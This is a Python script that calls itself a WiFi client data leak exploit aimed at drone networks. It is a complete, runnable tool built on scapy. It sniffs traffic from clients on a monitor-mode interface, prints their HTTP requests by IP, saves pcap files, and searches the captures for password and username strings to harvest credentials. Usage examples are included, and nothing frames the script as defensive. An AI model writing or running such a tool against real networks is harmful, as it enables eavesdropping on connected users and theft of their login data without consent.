#!/usr/bin/env python3
"""
WiFi Client Data Leak Exploit Script
Extracts data from WiFi clients connected to drone network
"""

import sys
import time
from collections import defaultdict

def check_scapy():
    """Check if scapy is available"""
    try:
        from scapy.all import sniff, IP, TCP, UDP, Raw
        return True
    except ImportError:
        return False

def capture_packets(interface, filter_expr=None, duration=60, output_file=None):
    """
    Capture network packets from WiFi clients
    
    Args:
        interface: Network interface to capture on
        filter_expr: BPF filter expression
        duration: Capture duration in seconds
        output_file: File to save captured data
    """
    scapy_available = check_scapy()
    
    if not scapy_available:
        print("[-] scapy not available")
        print("[!] Install with: pip install scapy")
        print("[!] On Linux, you may need: sudo apt-get install python3-scapy")
        return
    
    from scapy.all import sniff, IP, TCP, UDP, Raw, wrpcap
    
    print(f"[*] Starting packet capture on {interface}...")
    print(f"[*] Duration: {duration} seconds")
    if filter_expr:
        print(f"[*] Filter: {filter_expr}")
    print()
    
    captured_packets = []
    client_data = defaultdict(list)
    
    def process_packet(packet):
        """Process captured packet"""
        if IP in packet:
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            
            # Extract data from packet
            data = None
            protocol = None
            
            if TCP in packet:
                protocol = 'TCP'
                if Raw in packet:
                    data = packet[Raw].load
                    # Extract HTTP data
                    try:
                        http_data = data.decode('utf-8', errors='ignore')
                        if 'HTTP' in http_data or 'GET' in http_data or 'POST' in http_data:
                            client_data[src_ip].append({
                                'type': 'HTTP',
                                'data': http_data[:200],  # First 200 chars
                                'time': time.time()
                            })
                            print(f"[+] HTTP data from {src_ip}: {http_data[:100]}")
                    except:
                        pass
            
            elif UDP in packet:
                protocol = 'UDP'
                if Raw in packet:
                    data = packet[Raw].load
            
            if data:
                captured_packets.append(packet)
                if len(captured_packets) % 100 == 0:
                    print(f"[*] Captured {len(captured_packets)} packets...")
    
    # Start capture
    try:
        packets = sniff(iface=interface, filter=filter_expr, timeout=duration, prn=process_packet)
        print(f"\n[+] Capture complete: {len(packets)} packets captured")
    except Exception as e:
        print(f"[-] Error during capture: {e}")
        return
    
    # Save to file if specified
    if output_file:
        try:
            wrpcap(output_file, captured_packets)
            print(f"[+] Packets saved to {output_file}")
        except Exception as e:
            print(f"[-] Error saving packets: {e}")
    
    # Summary
    print("\n" + "="*50)
    print("CAPTURE SUMMARY")
    print("="*50)
    print(f"Total packets: {len(captured_packets)}")
    print(f"Unique clients: {len(client_data)}")
    
    for client_ip, data_list in client_data.items():
        print(f"\nClient: {client_ip}")
        print(f"  Data entries: {len(data_list)}")
        for entry in data_list[:5]:  # Show first 5
            print(f"    [{entry['type']}] {entry['data'][:80]}...")

def monitor_wifi_traffic(interface='wlan0mon', duration=60):
    """
    Monitor WiFi traffic for data leaks
    
    Args:
        interface: Monitor mode interface
        duration: Monitoring duration in seconds
    """
    print(f"[*] Monitoring WiFi traffic on {interface}...")
    print(f"[*] This will capture all traffic visible on the WiFi network")
    
    # Capture all traffic (no filter)
    capture_packets(interface, duration=duration)

def extract_credentials(packet_file):
    """
    Extract credentials from captured packets
    
    Args:
        packet_file: Path to pcap file
    """
    scapy_available = check_scapy()
    
    if not scapy_available:
        print("[-] scapy not available")
        return
    
    from scapy.all import rdpcap, IP, TCP, Raw
    
    print(f"[*] Analyzing packets in {packet_file}...")
    
    try:
        packets = rdpcap(packet_file)
        print(f"[+] Loaded {len(packets)} packets")
        
        credentials = []
        
        for packet in packets:
            if IP in packet and TCP in packet and Raw in packet:
                try:
                    data = packet[Raw].load.decode('utf-8', errors='ignore')
                    
                    # Look for login patterns
                    if 'password' in data.lower() or 'username' in data.lower():
                        credentials.append(data)
                        print(f"[+] Potential credential data: {data[:200]}")
                except:
                    pass
        
        print(f"\n[+] Found {len(credentials)} potential credential entries")
        
    except Exception as e:
        print(f"[-] Error analyzing packets: {e}")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 wifi_client_data_leak.py <interface> [action] [options...]")
        print("\nArguments:")
        print("  interface    Network interface (e.g., wlan0mon)")
        print("  action       Action to perform:")
        print("               capture    Capture packets (default)")
        print("               monitor    Monitor WiFi traffic")
        print("               extract    Extract credentials from pcap file")
        print("\nOptions:")
        print("  --duration <sec>    Capture duration (default: 60)")
        print("  --filter <expr>     BPF filter expression")
        print("  --output <file>     Output pcap file")
        print("\nExamples:")
        print("  python3 wifi_client_data_leak.py wlan0mon capture")
        print("  python3 wifi_client_data_leak.py wlan0mon monitor --duration 120")
        print("  python3 wifi_client_data_leak.py wlan0mon extract captured.pcap")
        sys.exit(1)
    
    interface = sys.argv[1]
    action = sys.argv[2] if len(sys.argv) > 2 else 'capture'
    
    # Parse options
    duration = 60
    filter_expr = None
    output_file = None
    
    i = 3
    while i < len(sys.argv):
        if sys.argv[i] == '--duration' and i + 1 < len(sys.argv):
            try:
                duration = int(sys.argv[i + 1])
                if duration < 1:
                    raise ValueError("Duration must be at least 1 second")
                if duration > 3600:
                    print("[!] Warning: Duration exceeds 1 hour")
            except (ValueError, TypeError) as e:
                print(f"[-] Invalid duration: {e}")
                sys.exit(1)
            i += 2
        elif sys.argv[i] == '--filter' and i + 1 < len(sys.argv):
            filter_expr = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == '--output' and i + 1 < len(sys.argv):
            output_file = sys.argv[i + 1]
            # Validate output file path
            from pathlib import Path
            output_path = Path(output_file)
            try:
                output_path.parent.mkdir(parents=True, exist_ok=True)
                test_file = output_path.parent / ".write_test"
                test_file.touch()
                test_file.unlink()
            except (OSError, PermissionError) as e:
                print(f"[-] Cannot write to output file '{output_file}': {e}")
                sys.exit(1)
            i += 2
        else:
            i += 1
    
    # Perform action
    if action == 'capture':
        capture_packets(interface, filter_expr, duration, output_file)
    elif action == 'monitor':
        monitor_wifi_traffic(interface, duration)
    elif action == 'extract':
        if len(sys.argv) < 4:
            print("[-] Missing pcap file for extract action")
            sys.exit(1)
        extract_file = sys.argv[3]
        # Validate extract file exists
        from pathlib import Path
        extract_path = Path(extract_file)
        if not extract_path.exists():
            print(f"[-] File not found: {extract_file}")
            sys.exit(1)
        if not extract_path.is_file():
            print(f"[-] Path is not a file: {extract_file}")
            sys.exit(1)
        extract_credentials(extract_file)
    else:
        print(f"[-] Unknown action: {action}")
        sys.exit(1)

if __name__ == "__main__":
    main()
